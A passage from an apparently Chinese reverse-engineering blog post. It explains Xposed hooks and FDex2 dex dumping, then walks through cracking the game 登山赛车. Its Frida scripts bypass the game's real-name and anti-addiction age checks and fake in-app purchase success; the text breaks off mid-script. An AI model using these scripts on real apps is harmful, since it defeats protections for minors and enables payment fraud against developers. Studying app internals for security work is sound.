class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (!lpparam.packageName.equals(<span class="string">&quot;com.target.app&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Hooking: &quot;</span> + lpparam.packageName);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Hook getPackageName()</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(<span class="string">&quot;android.app.Application&quot;</span>, lpparam.classLoader, <span class="string">&quot;getPackageName&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> &#123;</span><br><span class="line">                    param.setResult(<span class="string">&quot;com.fake.package&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleInitPackageResources</span><span class="params">(XC_InitPackageResources.InitPackageResourcesParam resparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (!resparam.packageName.equals(<span class="string">&quot;com.target.app&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改界面</span></span><br><span class="line">        resparam.res.setReplacement(<span class="string">&quot;com.target.app&quot;</span>, <span class="string">&quot;string&quot;</span>, <span class="string">&quot;app_name&quot;</span>, <span class="string">&quot;Hooked App!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="de-robv-android-xposed-callbacks"><a href="#de-robv-android-xposed-callbacks" class="headerlink" title="de.robv.android.xposed.callbacks"></a>de.robv.android.xposed.callbacks</h2><p>包含了 Xposed 框架中的回调接口和类，用于处理模块与框架之间的交互</p><h2 id="de-robv-android-xposed-services"><a href="#de-robv-android-xposed-services" class="headerlink" title="de.robv.android.xposed.services"></a>de.robv.android.xposed.services</h2><p>提供了与系统服务交互的工具类，通常用于读取文件、获取系统信息等操作</p><p>主要就是<code>BaseService</code>类</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-10_203509.png" alt=""></p><h1 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h1><h2 id="FDex2源码分析"><a href="#FDex2源码分析" class="headerlink" title="FDex2源码分析"></a>FDex2源码分析</h2><p>FDex2是早期针对整体加固的脱壳xposed模块, 其源码并不复杂</p><p>其依赖了android7.0以前的两个特殊方法<code>getDex</code>和<code>getBytes</code>(这两个方法在android8开始废弃)</p><p>android中java.lang.Class类有一个名为getDex的方法, 可以获得某一个类的Dex对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Dex <span class="title function_">getDex</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (dexCache == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dexCache.getDex();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dex又有一个方法名为getBytes, 可以获取Dex对象的内存数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getBytes() &#123;</span><br><span class="line">        <span class="type">ByteBuffer</span> <span class="variable">data</span> <span class="operator">=</span> <span class="built_in">this</span>.data.duplicate(); <span class="comment">// positioned ByteBuffers aren&#x27;t thread safe</span></span><br><span class="line">        <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[data.capacity()];</span><br><span class="line">        data.position(<span class="number">0</span>);</span><br><span class="line">        data.get(result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FDex2首先就是通过反射获取这两个类的引用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initRefect</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// public byte[] getBytes()</span></span><br><span class="line">           Dex = Class.forName(<span class="string">&quot;com.android.dex.Dex&quot;</span>);</span><br><span class="line">           Dex_getBytes = Dex.getDeclaredMethod(<span class="string">&quot;getBytes&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">           <span class="comment">// public Dex getDex()</span></span><br><span class="line">           getDex = Class.forName(<span class="string">&quot;java.lang.Class&quot;</span>).getDeclaredMethod(<span class="string">&quot;getDex&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>接着使用xposed对<code>java.lang.ClassLoader</code>的<code>loadClass</code>方法进行hook</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        initRefect();</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;目标包名：&quot;</span>+ lpparam.packageName);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;java.lang.ClassLoader&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;loadClass&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">packagename</span> <span class="operator">=</span> <span class="string">&quot;com.jiongji.andriod.card&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//   protected Class&lt;?&gt; loadClass(String className, boolean resolve) throws ClassNotFoundException</span></span><br><span class="line">        <span class="keyword">if</span>(lpparam.packageName.equals(packagename))&#123;</span><br><span class="line">            <span class="comment">// public static Unhook findAndHookMethod(String var0, ClassLoader var1, String var2, Object... var3)</span></span><br><span class="line">            XposedHelpers.findAndHookMethod(str, lpparam.classLoader, str2, String.class, Boolean.TYPE, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                    <span class="comment">//获取hook函数返回类</span></span><br><span class="line">                    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> (Class) param.getResult();</span><br><span class="line">                    <span class="keyword">if</span>(cls == <span class="literal">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> cls.getName();</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;当前类名：&quot;</span>+name);</span><br><span class="line">                    <span class="type">byte</span>[] bArr = (<span class="type">byte</span>[]) Dex_getBytes.invoke(getDex.invoke(cls,<span class="literal">null</span>)); <span class="comment">//Class.getDex().getBytes()</span></span><br><span class="line">                    <span class="keyword">if</span>(bArr == <span class="literal">null</span>) &#123;</span><br><span class="line">                        XposedBridge.log(<span class="string">&quot;数据为空，返回&quot;</span>);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;开始写数据&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">dex_path</span> <span class="operator">=</span> <span class="string">&quot;/data/data/&quot;</span>+packagename+<span class="string">&quot;/&quot;</span>+packagename+<span class="string">&quot;_&quot;</span>+bArr.length+<span class="string">&quot;.dex&quot;</span>;</span><br><span class="line">                    XposedBridge.log(dex_path);</span><br><span class="line">                    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dex_path);</span><br><span class="line">                    <span class="keyword">if</span>(file.exists())&#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    writeByte(bArr,file.getAbsolutePath());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其入口是<code>IXposedHookLoadPackage</code>, 在应用加载时触发回调</p><p>之后使用方法<code>findAndHookMethod</code>进行hook, 该方法有2个重载</p><p>这里选择的是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Unhook <span class="title function_">findAndHookMethod</span><span class="params">(</span></span><br><span class="line"><span class="params">    String className,          // 目标类的全限定名</span></span><br><span class="line"><span class="params">    ClassLoader classLoader,    // 目标类的类加载器</span></span><br><span class="line"><span class="params">    String methodName,         // 目标方法名</span></span><br><span class="line"><span class="params">    Object... parameterTypesAndCallback // 方法参数类型和回调</span></span><br><span class="line"><span class="params">)</span></span><br></pre></td></tr></table></figure><p>第四个参数是可变参数, 用于指定目标方法的<u>参数类型</u>和回调逻辑, 且参数类型的顺序必须与目标方法的签名一致(避免有重载的情况)</p><p>源码中就是hook <code>java.lang.ClassLoader</code>的<code>loadClass</code>方法</p><p>待其执行完毕后从返回值获取到加载得到的类, 并调用<code>getDex</code>方法和<code>getBytes</code>方法从而获取到对应的内存字节流并将其保存</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeByte</span><span class="params">(<span class="type">byte</span>[] bArr,String str)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(str);</span><br><span class="line">            outputStream.write(bArr);</span><br><span class="line">            outputStream.close();</span><br><span class="line">        &#125;  <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;文件写出失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个脚本完全也可以通过frida来实现</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">savedex</span>(<span class="params">dexbytes, dexpath</span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">File</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.File&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">FileOutputStream</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.FileOutputStream&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> fileobj = <span class="title class_">File</span>.$new(dexpath);</span><br><span class="line">        <span class="keyword">var</span> fileOutputStreamobj = <span class="title class_">FileOutputStream</span>.$new(fileobj);</span><br><span class="line">        fileOutputStreamobj.<span class="title function_">write</span>(dexbytes);</span><br><span class="line">        fileOutputStreamobj.<span class="title function_">close</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;[dumpdex] Dex saved to: &quot;</span> + dexpath);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fdex2</span>(<span class="params">classname</span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoadersSync</span>().<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">loader</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">var</span> <span class="title class_">ThisClass</span> = loader.<span class="title function_">loadClass</span>(classname);</span><br><span class="line">                <span class="keyword">if</span> (<span class="title class_">ThisClass</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[dumpdex] Found class: &quot;</span> + classname + <span class="string">&quot; in loader: &quot;</span> + loader);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">var</span> dexobj = <span class="title class_">ThisClass</span>.<span class="title function_">getDex</span>();</span><br><span class="line">                    <span class="keyword">if</span> (dexobj) &#123;</span><br><span class="line">                        <span class="keyword">var</span> dexbytearray = dexobj.<span class="title function_">getBytes</span>();</span><br><span class="line">                        <span class="keyword">if</span> (dexbytearray) &#123;</span><br><span class="line">                            <span class="keyword">var</span> savedexpath = <span class="string">&quot;/sdcard/&quot;</span> + classname.<span class="title function_">replace</span>(<span class="regexp">/\./g</span>, <span class="string">&quot;_&quot;</span>) + <span class="string">&quot;.dex&quot;</span>;</span><br><span class="line">                            <span class="title function_">savedex</span>(dexbytearray, savedexpath);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;[dumpdex] Failed to get Dex bytes for class: &quot;</span> + classname);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;[dumpdex] Failed to get Dex object for class: &quot;</span> + classname);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;[dumpdex] Error while processing loader: &quot;</span> + loader + <span class="string">&quot;, error: &quot;</span> + e.<span class="property">message</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">fdex2</span>(<span class="string">&quot;com.example.target.TargetClass&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="实战登山赛车"><a href="#实战登山赛车" class="headerlink" title="实战登山赛车"></a>实战登山赛车</h2><p>找款小游戏试试手, 登山赛车版本1.48.18, 没有加壳</p><p>游戏打开竟然要求实名</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-12_104718.png" alt=""></p><p>且该窗口无法关闭, 所以首先得想办法pass掉实名验证</p><p>jadx打开, 通过activity记录能够知道, 由<code>MyStartActivity</code>启动了<code>IDCheckDialog</code>进行验证</p><p>一开始的想法是hook点击确定后的doRidCheck函数</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-12_104949.png" alt=""></p><p>但发现这个函数怎么都hook不到, 但他的同级函数却可以被hook, 暂时搞不明白</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-12_105901.png" alt=""></p><p>发现只有当actAsIdVerifyActivity为true时才会进入验证过程, 其又依赖于loginActivityExists的返回值</p><p><code>private boolean actAsIdVerifyActivity = !loginActivityExists();</code></p><p>所以我们直接hook loginActivityExists的返回值为true</p><p>先使用frida尝试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">MyStartActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.mygamez.common.MyStartActivity&quot;</span>);</span><br><span class="line">    <span class="title class_">MyStartActivity</span>[<span class="string">&quot;loginActivityExists&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;MyStartActivity.loginActivityExists is called&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;loginActivityExists&quot;</span>]();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;MyStartActivity.loginActivityExists result=&quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-12_110418.png" alt=""></p><p>成功加载但显然后续还有其他检测, 通过关键字可以知道游戏检测到了我们是游客模式</p><p>在防沉迷类下找到这三个函数</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-12_110541.png" alt=""></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">MyStartActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.mygamez.common.MyStartActivity&quot;</span>);</span><br><span class="line">    <span class="title class_">MyStartActivity</span>[<span class="string">&quot;loginActivityExists&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;MyStartActivity.loginActivityExists is called&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;loginActivityExists&quot;</span>]();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;MyStartActivity.loginActivityExists result=&quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">AntiAddictionManagerInstance</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.mygamez.common.antiaddiction.AntiAddictionManager$AntiAddictionManagerInstance&quot;</span>);</span><br><span class="line">    <span class="title class_">AntiAddictionManagerInstance</span>[<span class="string">&quot;isGuestMode&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;AntiAddictionManagerInstance.isGuestMode is called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">AntiAddictionManagerInstance</span>[<span class="string">&quot;getUserAge&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;AntiAddictionManagerInstance.getUserAge is called&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;getUserAge&quot;</span>]();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;AntiAddictionManagerInstance.getUserAge result=&quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">20</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>之后就可以成功进入游戏, 尝试内购</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-12_110839.png" alt=""></p><p>提示需要安装微信, 通过字符串找到检测处</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-12_111012.png" alt=""></p><p>然后其调用处判断返回值是否是空串, 如果是则说明没有错误, 所以hook其返回值始终返回空</p><p>接着继续搜索购买失败, 找到对应关键处</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-12_111153.png" alt=""></p><p>可以知道只有getResultCode返回1时才是购买成功, hook其返回值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">MyStartActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.mygamez.common.MyStartActivity&quot;</span>);</span><br><span class="line">    <span class="title class_">MyStartActivity</span>[<span class="string">&quot;loginActivityExists&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;MyStartActivity.loginActivityExists is called&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;loginActivityExists&quot;</span>]();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;MyStartActivity.loginActivityExists result=&quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">AntiAddictionManagerInstance</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.mygamez.common.antiaddiction.AntiAddictionManager$AntiAddictionManagerInstance&quot;</span>);</span><br><span class="line">    <span class="title class_">AntiAddictionManagerInstance</span>[<span class="string">&quot;isGuestMode&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;AntiAddictionManagerInstance.isGuestMode is called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">AntiAddictionManagerInstance</span>[<span class="string">&quot;getUserAge&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;AntiAddictionManagerInstance.getUserAge is called&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;getUserAge&quot;</span>]();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;AntiAddictionManagerInstance.getUserAge result=&quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">20</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">BillingWrapperWeChat</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.mygamez.billing.BillingWrapperWeChat&quot;</span>);</span><br><span class="line">    <span class="title class_">BillingWrapperWeChat</span>[<span class="string">&quot;checkIfOkToContinuePaymentPaymentSpecificRequirements&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;BillingWrapperWeChat.checkIfOkToContinuePaymentPaymentSpecificRequirements is called&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;checkIfOkToContinuePaymentPaymentSpecificRequirements&quot;</span>]();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span 